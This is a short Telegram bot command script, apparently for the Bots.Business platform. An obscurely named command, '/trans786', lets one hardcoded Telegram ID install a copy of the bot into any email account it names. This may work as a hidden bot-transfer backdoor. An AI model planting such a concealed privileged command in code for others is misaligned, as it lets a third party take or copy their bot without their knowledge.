/*CMD
  command: /trans786
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: Send

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

if(user.telegramid!="1417873264"){
Bot.sendMessage('u r not a admin')
return}
BBAdmin.installBot({
  email: message,
  bot_id: bot.id
})
Bot.sendMessage("Done")
